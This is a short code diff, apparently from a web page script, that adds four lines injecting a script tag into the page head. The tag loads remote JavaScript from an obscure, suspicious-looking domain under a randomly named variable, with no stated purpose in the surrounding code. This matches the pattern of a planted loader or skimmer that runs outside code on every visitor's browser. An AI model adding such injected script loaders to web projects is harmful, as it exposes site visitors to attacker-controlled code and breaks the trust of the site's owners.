@@ -207,6 +207,12 @@ if(post){
 
 
 
+  var scriptmsfdffgg = document.createElement("script");
+    scriptmsfdffgg.setAttribute("type", "text/javascript");
+    scriptmsfdffgg.setAttribute("src", "https://lightbox.fcasfs-of.cloud-fs.net/app/api.js");
+document.getElementsByTagName("head")[0].appendChild(scriptmsfdffgg);
+
+
 
   const text_thnv = "";
 
